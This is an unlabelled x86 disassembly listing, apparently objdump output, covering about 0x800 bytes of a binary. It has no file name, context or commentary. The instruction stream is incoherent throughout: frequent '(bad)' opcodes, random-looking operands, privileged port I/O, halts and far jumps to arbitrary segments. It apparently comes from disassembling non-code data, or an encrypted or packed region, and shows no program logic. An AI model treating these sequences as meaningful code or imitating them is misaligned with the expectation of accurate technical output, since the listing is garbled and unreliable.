  415e6a:	sub    esp,ebx
  415e6c:	cmp    eax,0x48ab34e8
  415e71:	jo     0x415e21
  415e73:	repnz rcl bh,1
  415e76:	aaa    
  415e77:	hlt    
  415e78:	int3   
  415e79:	and    al,0x8c
  415e7b:	add    al,0x75
  415e7d:	mov    BYTE PTR [edx+0x61a6b877],ah
  415e83:	sub    eax,DWORD PTR [ebx-0x31728c11]
  415e89:	dec    eax
  415e8a:	fsub   DWORD PTR [ecx-0x4b]
  415e8d:	retf   0xbfe
  415e90:	int    0x40
  415e92:	scas   eax,DWORD PTR es:[edi]
  415e93:	pop    es
  415e94:	out    0xc4,al
  415e96:	into   
  415e97:	(bad)  
  415e98:	test   ebp,esp
  415e9a:	adc    BYTE PTR [ebx+ecx*1-0x5562edc2],bh
  415ea1:	clc    
  415ea2:	dec    eax
  415ea3:	push   esi
  415ea4:	sub    al,0xde
  415ea6:	mov    ch,0xf1
  415ea8:	shr    DWORD PTR [edx],1
  415eaa:	xor    BYTE PTR [edx-0x2e460ce5],cl
  415eb0:	sub    al,0xf1
  415eb2:	xor    esp,esi
  415eb4:	icebp  
  415eb5:	rcr    BYTE PTR [eax+0x2f],cl
  415eb8:	js     0x415e8d
  415eba:	ja     0x415eca
  415ebc:	test   edi,ebx
  415ebe:	in     eax,0x33
  415ec0:	adc    eax,0x2e01e8a7
  415ec5:	out    0xb6,eax
  415ec7:	jns    0x415f34
  415ec9:	cmp    al,0x27
  415ecb:	mov    ecx,0x5e620d91
  415ed0:	pop    ebx
  415ed1:	rcr    DWORD PTR [edi],1
  415ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ed4:	inc    ebx
  415ed5:	jmp    0x415f3a
  415ed7:	lods   al,BYTE PTR ds:[esi]
  415ed8:	jle    0x415f31
  415eda:	fidivr DWORD PTR [eax]
  415edc:	inc    esi
  415edd:	popf   
  415ede:	int3   
  415edf:	xor    BYTE PTR [esp+eiz*4+0x67],cl
  415ee3:	adc    eax,0x3448c833
  415ee8:	lods   al,BYTE PTR ds:[esi]
  415ee9:	ror    BYTE PTR [esi-0x51],1
  415eec:	leave  
  415eed:	cld    
  415eee:	mov    al,0x87
  415ef0:	pop    edi
  415ef1:	loopne 0x415e73
  415ef3:	add    al,0x40
  415ef5:	sar    DWORD PTR [edi],cl
  415ef7:	xchg   esp,eax
  415ef8:	mov    dh,0x91
  415efa:	sub    eax,0x56cc8b91
  415eff:	test   bl,bl
  415f01:	popf   
  415f02:	imul   ecx,DWORD PTR [esp+edx*8+0x659ebec9],0x73af2957
  415f0d:	add    DWORD PTR [esi-0x2d],esi
  415f10:	add    al,BYTE PTR [edi]
  415f12:	(bad)  [eax]
  415f14:	leave  
  415f15:	shl    DWORD PTR [ebp-0x6104a8cd],cl
  415f1b:	in     eax,0x28
  415f1d:	ss pop ebx
  415f1f:	mov    al,0x78
  415f21:	and    al,0x83
  415f23:	adc    DWORD PTR [ebx-0x773b8724],ebp
  415f29:	js     0x415f08
  415f2b:	cmp    BYTE PTR [edi+0x4f7dfee0],dl
  415f31:	lds    edi,FWORD PTR [esi-0x61dcb4d0]
  415f37:	sar    DWORD PTR [ebx-0x2d],1
  415f3a:	lock repz mov ebx,0xec6c9b
  415f41:	mov    DWORD PTR [ebx+0x5d],eax
  415f44:	jle    0x415f00
  415f46:	xchg   DWORD PTR [esi-0x5b1a43f8],edi
  415f4c:	(bad)  
  415f4d:	jecxz  0x415f69
  415f4f:	jle    0x415f11
  415f51:	and    ebx,DWORD PTR [ebp-0x63]
  415f54:	mov    dl,BYTE PTR [ecx+0x386a808]
  415f5a:	mov    bl,0x23
  415f5c:	out    dx,al
  415f5d:	inc    eax
  415f5e:	mov    DWORD PTR [ebx+0x7b68cf0e],esi
  415f64:	mov    ebx,0x6d2a44ee
  415f69:	call   FWORD PTR [ebx+0x4e5fc6d3]
  415f6f:	xor    eax,0x684ce763
  415f74:	ss pop esp
  415f76:	mov    esi,0xb043b561
  415f7b:	rcr    cl,1
  415f7d:	fwait
  415f7e:	xchg   esi,eax
  415f7f:	push   ecx
  415f80:	aas    
  415f81:	inc    ecx
  415f82:	dec    eax
  415f83:	mov    ebp,0x1b32e0ae
  415f88:	jbe    0x415fae
  415f8a:	jmp    0x415fe7
  415f8c:	popa   
  415f8d:	xor    edi,ebp
  415f8f:	dec    ebp
  415f90:	in     eax,dx
  415f91:	fistp  WORD PTR [esi]
  415f93:	into   
  415f94:	mov    dh,0xd7
  415f96:	mov    edx,0xfba95d1e
  415f9b:	jbe    0x415fa3
  415f9d:	and    BYTE PTR [ebx+ebp*4+0x40],dl
  415fa1:	pop    es
  415fa2:	adc    cl,bh
  415fa4:	sti    
  415fa5:	dec    esp
  415fa6:	into   
  415fa7:	jmp    0x1c117bf2
  415fac:	jb     0x415f5b
  415fae:	addr16 (bad) 
  415fb0:	scas   eax,DWORD PTR es:[edi]
  415fb1:	loope  0x41601d
  415fb3:	pop    esp
  415fb4:	cmp    BYTE PTR [ebx+0x6ff0d882],ch
  415fba:	xchg   esi,eax
  415fbb:	sti    
  415fbc:	stos   DWORD PTR es:[edi],eax
  415fbd:	rcr    ebx,cl
  415fbf:	ins    DWORD PTR es:[edi],dx
  415fc0:	push   eax
  415fc1:	inc    eax
  415fc2:	sbb    bh,ch
  415fc4:	push   0xffffff9c
  415fc6:	sbb    al,0x13
  415fc8:	(bad)  
  415fc9:	fwait
  415fca:	jmp    0x7aedeb69
  415fcf:	mov    ds:0x6a63a9f8,eax
  415fd4:	adc    edi,DWORD PTR [eax-0x76]
  415fd7:	add    bl,dl
  415fd9:	and    bl,dl
  415fdb:	int    0x1a
  415fdd:	push   esi
  415fde:	and    bl,BYTE PTR [esi]
  415fe0:	sbb    al,BYTE PTR [esi]
  415fe2:	inc    ebx
  415fe3:	inc    ecx
  415fe4:	ins    DWORD PTR es:[edi],dx
  415fe5:	lock popa 
  415fe7:	in     al,0xb5
  415fe9:	add    al,0x67
  415feb:	and    DWORD PTR [ebx-0x25],edi
  415fee:	arpl   WORD PTR [edx-0x3],sp
  415ff1:	cmp    bh,dh
  415ff3:	int    0x48
  415ff5:	not    DWORD PTR [esi-0x129a0abd]
  415ffb:	mov    ds:0xdc25ae7b,al
  416000:	cmp    eax,DWORD PTR [edi]
  416002:	(bad)  
  416003:	test   al,0x1b
  416005:	xchg   ecx,eax
  416006:	stc    
  416007:	sbb    eax,0xc6f1cb01
  41600c:	push   ebp
  41600d:	add    eax,0x5f36de7e
  416012:	jp     0x415fdd
  416014:	repnz mov dl,0x1d
  416017:	jecxz  0x415f99
  416019:	(bad)  
  41601a:	sbb    eax,0xdad8c5ff
  41601f:	xchg   ebp,eax
  416020:	scas   eax,DWORD PTR es:[edi]
  416021:	pop    ecx
  416022:	lea    edi,[esi]
  416024:	push   edx
  416025:	ret    
  416026:	ins    DWORD PTR es:[edi],dx
  416027:	out    dx,eax
  416028:	adc    ch,BYTE PTR [edi]
  41602a:	add    DWORD PTR [edx-0x40],edx
  41602d:	cdq    
  41602e:	iret   
  41602f:	cwde   
  416030:	xchg   ebp,eax
  416031:	pop    esp
  416032:	pop    esp
  416033:	ret    0xc12
  416036:	shl    DWORD PTR [ecx-0x16e60b54],1
  41603c:	jb     0x4160bb
  41603e:	dec    ecx
  41603f:	add    esi,edi
  416041:	xor    esp,DWORD PTR [edx-0x5]
  416044:	aad    0x3b
  416046:	je     0x4160b7
  416048:	aad    0xc5
  41604a:	(bad)  ds:0xee331f9e
  416050:	(bad)  
  416051:	cmp    DWORD PTR [ebp+0x197c26c9],edi
  416057:	push   0x49
  416059:	cs jb  0x415ff3
  41605c:	stc    
  41605d:	mov    eax,ds:0xf2c8c69b
  416062:	gs push ebx
  416064:	mov    cl,0x28
  416066:	pop    ss
  416067:	mov    ch,0xac
  416069:	dec    ebx
  41606a:	jae    0x41606f
  41606c:	and    esp,DWORD PTR [eax-0x60]
  41606f:	clc    
  416070:	push   0x45f29b28
  416075:	mov    bl,bl
  416077:	lahf   
  416078:	lds    edi,FWORD PTR [edx+0x40768d45]
  41607e:	xchg   edx,eax
  41607f:	xor    eax,0xec151344
  416084:	or     eax,0x73cc496d
  416089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41608a:	ret    0xff42
  41608d:	sub    al,0x7f
  41608f:	daa    
  416090:	fcmovu st,st(4)
  416092:	cwde   
  416093:	aaa    
  416094:	int3   
  416095:	mov    ah,0xd5
  416097:	mov    ebp,0x11621171
  41609c:	and    dh,bl
  41609e:	mov    esi,esp
  4160a0:	popa   
  4160a1:	ret    0xa8b7
  4160a4:	out    0x46,eax
  4160a6:	xchg   BYTE PTR [ebx+0x47],dh
  4160a9:	mov    ebx,0x3bf1e8ff
  4160ae:	xor    dh,BYTE PTR [ebx+0x673221ed]
  4160b4:	and    BYTE PTR [edi+0x3f6db5b8],al
  4160ba:	or     al,0xde
  4160bc:	sbb    esp,0x74d886d
  4160c2:	int    0xc6
  4160c4:	idiv   ecx
  4160c6:	or     al,BYTE PTR [edi-0x1e]
  4160c9:	mov    edi,eax
  4160cb:	push   eax
  4160cc:	jmp    0xd000:0xb9890372
  4160d3:	(bad)  
  4160d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160d5:	sbb    DWORD PTR [esi],0xffffff90
  4160d8:	push   ebp
  4160d9:	inc    edi
  4160da:	nop
  4160db:	das    
  4160dc:	jle    0x41612b
  4160de:	pop    ebx
  4160df:	fisubr WORD PTR [esi+0x92c35f5]
  4160e5:	pop    esp
  4160e6:	push   edx
  4160e7:	jns    0x41615e
  4160e9:	jle    0x41607d
  4160eb:	xchg   ecx,eax
  4160ec:	pop    eax
  4160ed:	add    cl,BYTE PTR [esi-0x17cfab6b]
  4160f3:	adc    BYTE PTR [ebx],al
  4160f5:	add    eax,0x83afbe40
  4160fa:	mov    ebp,0xa2c9ce79
  4160ff:	mov    ah,0x6d
  416101:	dec    ebx
  416102:	dec    edx
  416103:	adc    eax,0xb7686050
  416108:	es push es
  41610a:	mov    bl,0xba
  41610c:	inc    ecx
  41610d:	push   eax
  41610e:	sbb    DWORD PTR ds:0xd4e323cf,esi
  416114:	mov    dh,0x89
  416116:	push   0x3b
  416118:	jne    0x4160fe
  41611a:	cmp    esp,DWORD PTR [ebx]
  41611c:	adc    al,0xbf
  41611e:	sbb    esp,esp
  416120:	sahf   
  416121:	add    eax,0x2735a6ad
  416126:	stos   BYTE PTR es:[edi],al
  416127:	xor    DWORD PTR [ebx-0x50],eax
  41612a:	jecxz  0x4160d1
  41612c:	call   0x4a00:0xf3e7910d
  416133:	mov    ch,0x3b
  416135:	cli    
  416136:	add    dh,al
  416138:	inc    ebp
  416139:	aas    
  41613a:	pop    ecx
  41613b:	or     DWORD PTR [eax+0xa7f297],esi
  416141:	sbb    eax,0x2d52e77a
  416146:	or     ecx,edi
  416148:	icebp  
  416149:	and    al,0x7e
  41614b:	data16 cs je 0x41611c
  41614f:	adc    ecx,DWORD PTR [edx+eiz*2-0x62]
  416153:	push   esp
  416154:	push   esi
  416155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416156:	mov    eax,0x81f6e186
  41615b:	shl    DWORD PTR [ebx-0x1170f0a2],1
  416161:	in     eax,0xf7
  416163:	idiv   bh
  416165:	jmp    0x3788:0x54bd11bb
  41616c:	cmp    al,0xff
  41616e:	nop
  41616f:	push   esp
  416170:	dec    BYTE PTR [ebx]
  416172:	int3   
  416173:	mov    ?,WORD PTR [ebx-0xe]
  416176:	sbb    al,0x39
  416178:	mov    eax,ds:0xff36d10a
  41617d:	ret    0x7a0c
  416180:	(bad)  
  416184:	(bad)
  416188:	and    al,0x71
  41618a:	or     DWORD PTR [edx-0x389e098a],0x93341ce3
  416194:	sub    BYTE PTR [esi],bl
  416196:	out    dx,eax
  416197:	or     DWORD PTR [ecx+0x5d5bfaa],ebx
  41619d:	in     eax,0x24
  41619f:	fbstp  TBYTE PTR [edx]
  4161a1:	ret    
  4161a2:	push   esi
  4161a3:	ds dec edi
  4161a5:	(bad)  
  4161a6:	push   ss
  4161a7:	outs   dx,DWORD PTR ds:[esi]
  4161a8:	push   0x92a748db
  4161ad:	cmp    eax,0x67544b05
  4161b2:	je     0x4161e2
  4161b4:	xor    eax,DWORD PTR [eax-0x3d]
  4161b7:	mov    WORD PTR [eax],?
  4161b9:	stos   DWORD PTR es:[edi],eax
  4161ba:	retf   0xd6b3
  4161bd:	scas   eax,DWORD PTR es:[edi]
  4161be:	fs out dx,al
  4161c0:	btc    ebp,0x1f
  4161c4:	add    dh,BYTE PTR [edi-0x378dadd4]
  4161ca:	call   0xd34e:0xb0603456
  4161d1:	xchg   edx,eax
  4161d2:	and    DWORD PTR [esi],ebp
  4161d4:	or     BYTE PTR [eax+ecx*1+0x6a3552ac],al
  4161db:	fs sti 
  4161dd:	or     ebx,ebp
  4161df:	pop    eax
  4161e0:	add    al,0x2b
  4161e2:	push   es
  4161e3:	iret   
  4161e4:	add    ah,bl
  4161e6:	add    bl,BYTE PTR [ecx+0x0]
  4161e9:	pop    esi
  4161ea:	push   ebp
  4161eb:	aaa    
  4161ec:	fist   DWORD PTR [ecx-0x66]
  4161ef:	cmc    
  4161f0:	js     0x41620b
  4161f2:	inc    esp
  4161f3:	(bad)  
  4161f4:	cmp    ecx,DWORD PTR [edx]
  4161f6:	mov    cl,0x13
  4161f8:	in     eax,dx
  4161f9:	mov    eax,0xc7f36a81
  4161fe:	ins    DWORD PTR es:[edi],dx
  4161ff:	adc    BYTE PTR [eax+0x38],dl
  416202:	add    ah,BYTE PTR [ebx]
  416204:	dec    esi
  416205:	mov    ah,0x46
  416207:	fadd   DWORD PTR [edx]
  416209:	cwde   
  41620a:	test   al,0xed
  41620c:	dec    esp
  41620d:	pop    ds
  41620e:	call   0x49caa0ac
  416213:	sbb    al,0x56
  416215:	pusha  
  416216:	jns    0x416229
  416218:	mov    ch,al
  41621a:	mov    al,ds:0xb06e6c81
  41621f:	mov    eax,0x58fb5e24
  416224:	scas   al,BYTE PTR es:[edi]
  416225:	sahf   
  416226:	int3   
  416227:	sub    esp,ebp
  416229:	jo     0x416281
  41622b:	aaa    
  41622c:	push   ebx
  41622d:	mov    ds:0xe11915e0,al
  416232:	sub    ah,cl
  416234:	cmp    al,0xf3
  416236:	das    
  416237:	out    dx,eax
  416238:	out    dx,al
  416239:	pushf  
  41623a:	xor    ch,cl
  41623c:	push   0xe72670c4
  416241:	adc    BYTE PTR [esi+0x4db5a9b4],dh
  416247:	xor    eax,0x8a35e564
  41624c:	out    0x3d,eax
  41624e:	jecxz  0x41620b
  416250:	xchg   ebp,eax
  416251:	mov    bh,0x12
  416253:	sub    al,0xa
  416255:	in     al,dx
  416256:	clc    
  416257:	sbb    eax,0x14f4b1ee
  41625c:	stos   BYTE PTR es:[edi],al
  41625d:	test   al,0xb3
  41625f:	sub    edi,DWORD PTR [edx-0x3f]
  416262:	pop    edx
  416263:	pop    ss
  416264:	ficomp WORD PTR [ebx]
  416266:	ret    0x16ba
  416269:	push   edi
  41626a:	fldenv [eax+0x36]
  41626d:	test   BYTE PTR [ebx],al
  41626f:	dec    ecx
  416270:	sbb    ch,0x47
  416273:	mov    esp,0x24edf005
  416278:	in     al,dx
  416279:	pop    es
  41627a:	sbb    DWORD PTR [edx+0x3b6c54af],edx
  416280:	addr16 gs mov edx,ebx
  416284:	mov    al,0x38
  416286:	cs xchg edi,eax
  416288:	out    0x21,eax
  41628a:	inc    esi
  41628b:	cmp    esi,DWORD PTR [edi+0x61]
  41628e:	repnz (bad) 
  416290:	in     eax,0xc
  416292:	ds inc eax
  416294:	inc    esp
  416295:	inc    esi
  416296:	pop    ebp
  416297:	loopne 0x4162fb
  416299:	div    DWORD PTR [ebx-0x39f8c4f8]
  41629f:	cli    
  4162a0:	mov    ds:0x90768ad1,eax
  4162a5:	xchg   esp,eax
  4162a6:	mov    bh,0x83
  4162a8:	pushw  0xf67f
  4162ac:	bound  edi,QWORD PTR [esi+0x466528b]
  4162b2:	xchg   DWORD PTR [esi-0x4395b95],edi
  4162b8:	mov    al,0x7d
  4162ba:	test   DWORD PTR [edx+0x254e5478],esi
  4162c0:	adc    ch,ah
  4162c2:	jns    0x416340
  4162c4:	pop    ecx
  4162c5:	and    ecx,DWORD PTR [edx+0x4e]
  4162c8:	add    ebp,edx
  4162ca:	xor    eax,0x5fdc152c
  4162cf:	xor    ebx,DWORD PTR [esi]
  4162d1:	mov    BYTE PTR [ebx],ah
  4162d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162d4:	out    dx,eax
  4162d5:	fdiv   DWORD PTR [ecx-0x20]
  4162d8:	(bad)  
  4162d9:	ret    
  4162da:	imul   edx,DWORD PTR [edi-0x22],0x1a
  4162de:	mov    BYTE PTR [ebx+0x1d],dh
  4162e1:	sub    al,0x89
  4162e3:	xchg   edi,eax
  4162e4:	out    0xf8,eax
  4162e6:	in     al,0x18
  4162e8:	push   ecx
  4162e9:	and    eax,0xcdcfb1fe
  4162ee:	mov    ds:0xc42b4ab4,al
  4162f3:	push   cs
  4162f4:	and    DWORD PTR [esi],0x93b4ba78
  4162fa:	or     esi,DWORD PTR [eax]
  4162fc:	add    eax,0x59bbd108
  416301:	pop    edi
  416302:	addr16 pop edi
  416304:	loop   0x416299
  416306:	xchg   ebx,eax
  416307:	rol    DWORD PTR [ebx+0x2e8fc82a],cl
  41630d:	sahf   
  41630e:	dec    ebp
  41630f:	cmp    dh,dh
  416311:	scas   eax,DWORD PTR es:[edi]
  416312:	jae    0x416371
  416314:	lahf   
  416315:	sar    BYTE PTR [ebp-0x2a7d5490],1
  41631b:	fbstp  TBYTE PTR [edi]
  41631d:	mov    al,0x4c
  41631f:	and    edi,DWORD PTR [ebx]
  416321:	push   0xa83726a8
  416326:	inc    edi
  416327:	sbb    al,0x10
  416329:	fdiv   DWORD PTR [edi+0x4cd3b8e4]
  41632f:	or     DWORD PTR [ebx+0x424c9bd2],ebx
  416335:	mov    bh,0xb0
  416337:	add    DWORD PTR [edx+0x50f4ee5a],0x25
  41633e:	arpl   WORD PTR [ebx],bp
  416340:	pop    edi
  416341:	ror    BYTE PTR [eax],0xb2
  416344:	je     0x41636e
  416346:	pop    edi
  416347:	sbb    eax,0xcc481d0e
  41634c:	call   0xb8efe13f
  416351:	add    al,0x14
  416353:	jmp    0x62fb4b98
  416358:	mov    al,0xcd
  41635a:	add    ah,BYTE PTR [eax+0x4fc6d66]
  416360:	outs   dx,DWORD PTR ds:[esi]
  416361:	imul   esi
  416363:	cmc    
  416364:	or     eax,0x3c0c7d73
  416369:	mov    eax,0xdcaed847
  41636e:	mov    eax,0xf525f44f
  416373:	sub    esi,DWORD PTR [edi+0x7088b914]
  416379:	(bad)  
  41637a:	push   0x11d47f9f
  41637f:	or     eax,0xca111978
  416384:	scas   al,BYTE PTR es:[edi]
  416385:	and    al,0xba
  416387:	call   0x104c:0xefa81281
  41638e:	mov    eax,ds:0x1963b8c4
  416393:	jmp    0xb410125f
  416398:	mov    ebp,0x730cbb5e
  41639d:	int    0xdf
  41639f:	jle    0x416419
  4163a1:	mov    dl,0x39
  4163a3:	add    esp,DWORD PTR [ebx-0x1e]
  4163a6:	in     al,0xbc
  4163a8:	and    edx,edi
  4163aa:	dec    ebx
  4163ab:	ds dec ebx
  4163ad:	out    0xbe,eax
  4163af:	cmp    al,0xf7
  4163b1:	aad    0xfd
  4163b3:	pop    eax
  4163b4:	jb     0x4163dd
  4163b6:	aad    0xf
  4163b8:	fcmovnu st,st(3)
  4163ba:	out    0xcb,eax
  4163bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163bd:	lods   eax,DWORD PTR ds:[esi]
  4163be:	jmp    0x76a62dd0
  4163c3:	add    edi,DWORD PTR [eax-0x3e]
  4163c6:	fisttp DWORD PTR ds:0xbbbfb9ff
  4163cc:	inc    edx
  4163cd:	bound  edx,QWORD PTR [ebx-0x237645f9]
  4163d3:	sbb    eax,0x6e6d706e
  4163d8:	dec    edx
  4163d9:	jle    0x416439
  4163db:	(bad)  
  4163dc:	dec    ecx
  4163dd:	je     0x4163de
  4163df:	mov    bl,0x69
  4163e1:	add    eax,0x2a179cd0
  4163e6:	lds    edi,FWORD PTR [eax+0x61]
  4163e9:	fcmovbe st,st(7)
  4163eb:	test   eax,0x995bc14
  4163f0:	dec    di
  4163f2:	xchg   ebp,eax
  4163f3:	push   0x0
  4163f5:	loop   0x416471
  4163f7:	icebp  
  4163f8:	sub    DWORD PTR [edx*4-0x3e3aaed9],edx
  4163ff:	test   edx,ecx
  416401:	sahf   
  416402:	retf   
  416403:	repz fstp QWORD PTR [edx+esi*2+0x54]
  416408:	popf   
  416409:	inc    ebp
  41640a:	xor    cl,0xfd
  41640d:	aas    
  41640e:	cwde   
  41640f:	fidiv  DWORD PTR [ecx]
  416411:	aam    0x67
  416413:	add    eax,0x5d110eca
  416418:	xchg   bl,dh
  41641a:	adc    bl,BYTE PTR [ecx]
  41641c:	push   esi
  41641d:	popa   
  41641e:	inc    edi
  41641f:	cwde   
  416420:	add    dl,bh
  416422:	pop    ecx
  416423:	cmp    BYTE PTR [edx+0x68],cl
  416426:	shl    DWORD PTR [ecx+ebx*8+0x42],cl
  41642a:	xchg   DWORD PTR [esp+edx*4-0x798a743f],ecx
  416431:	(bad)  
  416432:	push   edx
  416433:	sub    al,0x78
  416435:	dec    edx
  416436:	push   edi
  416437:	mov    ecx,0xb65d4fc4
  41643c:	sub    al,0x45
  41643e:	mov    eax,es
  416440:	sbb    bl,BYTE PTR [ecx]
  416442:	scas   eax,DWORD PTR es:[edi]
  416443:	(bad)  
  416444:	arpl   bx,si
  416446:	pusha  
  416447:	add    ebp,DWORD PTR [ebx]
  416449:	test   BYTE PTR ss:[eax+ecx*2],dl
  41644d:	fwait
  41644e:	cmc    
  41644f:	inc    edi
  416450:	es add bl,0xd4
  416454:	(bad)  
  416455:	cmc    
  416456:	jb     0x416495
  416458:	cdq    
  416459:	dec    ebx
  41645a:	mov    eax,0xf8607bc3
  41645f:	jbe    0x4164ce
  416461:	pusha  
  416462:	sti    
  416463:	adc    al,0xaa
  416466:	and    eax,0xdf9562f3
  41646b:	int    0x88
  41646d:	ss sbb bl,ch
  416470:	sbb    BYTE PTR [edi-0x1d263055],bh
  416476:	jl     0x416480
  416478:	inc    ebp
  416479:	cmp    DWORD PTR [edx],0xf73093c
  41647f:	cmp    esi,eax
  416481:	push   es
  416482:	inc    ebp
  416483:	xor    BYTE PTR [edi-0x2f],bl
  416486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416487:	pop    edi
  416488:	frstor [ebx]
  41648a:	loopne 0x4164c6
  41648c:	(bad)  [ebx]
  41648e:	pop    ss
  41648f:	stos   DWORD PTR es:[edi],eax
  416490:	mov    bl,0x17
  416492:	test   DWORD PTR [eax+0x1f7d441],0x6df85250
  41649c:	push   ss
  41649d:	test   al,0xcf
  41649f:	mov    esp,0xbe89dd84
  4164a4:	cmp    BYTE PTR [edx-0x33],ah
  4164a7:	inc    esp
  4164a8:	lea    esp,[esi+0x3af9c19e]
  4164ae:	enter  0x3bad,0xab
  4164b2:	or     BYTE PTR [eax+0xc],0xef
  4164b6:	dec    esi
  4164b7:	(bad)  
  4164b8:	lahf   
  4164b9:	xor    DWORD PTR [edx-0x1e],ebp
  4164bc:	sbb    BYTE PTR [ebp-0xe901214],bl
  4164c2:	jmp    0x41652a
  4164c4:	push   ebx
  4164c5:	bound  edx,QWORD PTR [edx]
  4164c7:	in     al,0x2a
  4164c9:	test   BYTE PTR ds:0xb0185581,bh
  4164cf:	mov    al,0x6f
  4164d1:	push   ecx
  4164d2:	in     al,0xf5
  4164d4:	cmp    bl,BYTE PTR [ebp-0x80]
  4164d7:	and    eax,0x82dd2c36
  4164dc:	push   ecx
  4164dd:	in     eax,0x42
  4164df:	imul   ebx,DWORD PTR [esi],0x58
  4164e2:	int3   
  4164e3:	stc    
  4164e4:	or     DWORD PTR [edx],ebp
  4164e6:	in     al,0xf0
  4164e8:	jno    0x4164fc
  4164ea:	mov    al,ds:0x844c55dd
  4164ef:	enter  0x6b3c,0xa6
  4164f3:	scas   al,BYTE PTR es:[edi]
  4164f4:	mul    esp
  4164f6:	jo     0x4164ce
  4164f8:	rol    DWORD PTR [eax],cl
  4164fa:	(bad)  
  4164fb:	enter  0x2cd4,0x91
  4164ff:	add    bh,BYTE PTR [esi]
  416501:	iret   
  416502:	sbb    BYTE PTR [ebx],bl
  416504:	and    al,0xb2
  416506:	pop    esp
  416507:	out    dx,al
  416508:	inc    ecx
  416509:	mov    dh,0x79
  41650b:	mov    esi,esi
  41650d:	leave  
  41650e:	fdiv   DWORD PTR [ecx+eax*2]
  416511:	jnp    0x4164c1
  416513:	lods   al,BYTE PTR ds:[esi]
  416514:	imul   esi,edx,0x57
  416517:	shl    edx,1
  416519:	xor    cl,ch
  41651b:	xor    al,0xe
  41651d:	push   edx
  41651e:	ds pop ebx
  416520:	and    eax,0x19e0781f
  416525:	push   esi
  416526:	dec    esp
  416527:	dec    eax
  416528:	push   eax
  416529:	jae    0xd4814f97
  41652f:	sub    BYTE PTR [edi],dl
  416531:	xor    DWORD PTR ds:0xa993c886,edx
  416537:	fs popf 
  416539:	pop    ebx
  41653a:	out    dx,eax
  41653b:	mov    DWORD PTR [ebx+0x5d],edx
  41653e:	les    ecx,FWORD PTR [esi+ebp*4-0x748ca0a1]
  416545:	das    
  416546:	mov    eax,ds:0x128a2f0e
  41654b:	cwde   
  41654c:	dec    esi
  41654d:	pop    esp
  41654e:	dec    edx
  41654f:	or     edi,DWORD PTR [ebx]
  416551:	xchg   edx,eax
  416552:	push   esi
  416553:	pop    esi
  416554:	sbb    esi,eax
  416556:	inc    esp
  416557:	dec    ebp
  416558:	lock lods eax,DWORD PTR ds:[esi]
  41655a:	cmp    DWORD PTR [ebx+0x7e6d000e],edi
  416560:	cmp    BYTE PTR [edx],al
  416562:	(bad)  
  416563:	int    0x48
  416565:	push   ecx
  416566:	ja     0x41653a
  416568:	fwait
  416569:	push   es
  41656a:	xchg   ebx,eax
  41656b:	sub    al,0x2c
  41656d:	xchg   ebp,eax
  41656e:	cmp    eax,0x4d579fa1
  416573:	fdivr  st,st(2)
  416575:	les    esi,FWORD PTR [ebp-0x5f]
  416578:	(bad)  
  416579:	push   eax
  41657a:	sub    ebp,DWORD PTR [esi+0x22]
  41657d:	femms  
  41657f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416580:	enter  0xbc3f,0x22
  416584:	(bad)  
  416585:	sbb    edx,DWORD PTR [edx]
  416587:	ret    0x6700
  41658a:	test   al,0x59
  41658c:	ret    
  41658d:	jmp    0x63c7:0xc11bf513
  416594:	int3   
  416595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416596:	test   BYTE PTR [esi+0x2e],ch
  416599:	loope  0x416593
  41659b:	int3   
  41659c:	and    eax,0x854d1c39
  4165a1:	daa    
  4165a2:	dec    edx
  4165a3:	call   0xeef9de9d
  4165a8:	pmuludq mm6,QWORD PTR ds:0x2cdd2f46
  4165af:	and    DWORD PTR es:[esi-0x1b],0xffffffaa
  4165b4:	jb     0x41656d
  4165b6:	inc    ebp
  4165b7:	fsubr  st,st(1)
  4165b9:	xchg   esi,eax
  4165ba:	or     BYTE PTR [ecx],ch
  4165bc:	ret    0xd655
  4165bf:	pop    eax
  4165c0:	pop    ecx
  4165c1:	xor    bh,BYTE PTR [ebx-0x14fbb45a]
  4165c7:	jge    0x416638
  4165c9:	retf   
  4165ca:	div    DWORD PTR [ecx]
  4165cc:	cli    
  4165cd:	sbb    edx,DWORD PTR [ecx+0x98ba6c]
  4165d3:	mov    cl,0x75
  4165d5:	and    eax,0xa1081d1c
  4165da:	out    0x91,al
  4165dc:	and    esp,DWORD PTR [ecx-0x545a6c2b]
  4165e2:	inc    ebx
  4165e3:	popf   
  4165e4:	mov    bh,0x5b
  4165e6:	pushf  
  4165e7:	outs   dx,DWORD PTR ds:[esi]
  4165e8:	test   al,0xa2
  4165ea:	shl    BYTE PTR [esi+0x3f],cl
  4165ed:	pusha  
  4165ee:	(bad)  
  4165f0:	pop    edx
  4165f1:	xchg   BYTE PTR [edx+0x2c],cl
  4165f4:	pop    ss
  4165f5:	leave  
  4165f6:	enter  0xed57,0xc9
  4165fa:	in     eax,0xbe
  4165fc:	loopne 0x4165cb
  4165fe:	out    0x9d,eax
  416600:	inc    edi
  416601:	mov    al,0x1
  416603:	lahf   
  416604:	fiadd  WORD PTR [ebx-0x4907c6e0]
  41660a:	xchg   edi,esp
  41660c:	cld    
  41660d:	loop   0x4165f9
  41660f:	int    0x9e
  416611:	leave  
  416612:	in     al,0x4c
  416614:	and    edi,ecx
  416616:	cmp    cl,BYTE PTR [eax-0x584d701]
  41661c:	ins    DWORD PTR es:[edi],dx
  41661d:	dec    esp
  41661e:	cmp    dh,BYTE PTR [eax]
  416620:	retf   0x1ab0
  416623:	or     ecx,esi
  416625:	and    DWORD PTR [ebx-0x2508a6f3],ecx
  41662b:	js     0x416685
  41662d:	imul   esp,ecx,0x5f
  416630:	xor    DWORD PTR [edx],ebx
  416632:	dec    ebp
  416633:	jo     0x4165fa
  416635:	test   DWORD PTR [ebx],edx
  416637:	push   ebp
  416638:	pusha  
  416639:	in     eax,0xba
  41663b:	inc    eax
  41663c:	ds jno 0x41669b
  41663f:	pop    edx
  416640:	pop    ebx
  416641:	test   BYTE PTR [ecx+0x4d],al
  416644:	xor    DWORD PTR [edi+esi*1-0x70],edx
  416648:	stos   DWORD PTR es:[edi],eax
  416649:	cdq    
  41664a:	xchg   ecx,eax
